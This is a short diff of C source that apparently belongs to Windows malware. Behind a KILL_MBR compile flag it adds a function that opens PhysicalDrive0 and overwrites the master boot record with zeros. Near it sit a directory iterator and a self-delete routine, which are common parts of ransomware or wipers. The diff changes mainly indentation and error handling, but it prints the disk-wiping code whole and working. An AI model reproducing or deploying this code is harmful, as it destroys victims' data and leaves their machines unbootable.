@@ -126,27 +126,27 @@ BOOL fnDirectoryIteratorW(
 //}
 
 #if KILL_MBR == TRUE
-// at somepoint I might implement a custom MBR displaying a message
-BOOL fnOverwriteMBR(VOID) {
-	WCHAR szMbrData[nMBR];
-	ZeroMemory(&szMbrData, sizeof(szMbrData));
-	DWORD dwNOBW;
+	// at somepoint I might implement a custom MBR displaying a message
+	BOOL fnOverwriteMBR(VOID) {
+		WCHAR szMbrData[nMBR];
+		ZeroMemory(&szMbrData, sizeof(szMbrData));
+		DWORD dwNOBW;
 
-	HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-	if (hMbr) {
-		if (WriteFile(hMbr, szMbrData, nMBR, &dwNOBW, NULL)) {
-			CloseHandle(hMbr);
-			return TRUE;
+		HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+		if (hMbr) {
+			if (WriteFile(hMbr, szMbrData, nMBR, &dwNOBW, NULL)) {
+				CloseHandle(hMbr);
+				return TRUE;
+			} else {
+				fnERRORHANDLERW(L"Couldn't overwrite MBR", NULL, L"WriteFile", MB_ICONERROR);
+				CloseHandle(hMbr);
+				return FALSE;
+			}
 		} else {
-			fnERRORHANDLERW(L"Couldn't overwrite MBR", NULL, L"WriteFile", MB_ICONERROR);
-			CloseHandle(hMbr);
+			fnERRORHANDLERW(L"Couldn't open Handle \"hMbr\" to MBR", NULL, L"CreateFileW", MB_ICONERROR);
 			return FALSE;
 		}
-	} else {
-		fnERRORHANDLERW(L"Couldn't open Handle \"hMbr\" to MBR", NULL, L"CreateFileW", MB_ICONERROR);
-		return FALSE;
 	}
-}
 #endif // KILL_MBR
 
 BOOL fnSelfDeleteW(VOID) {
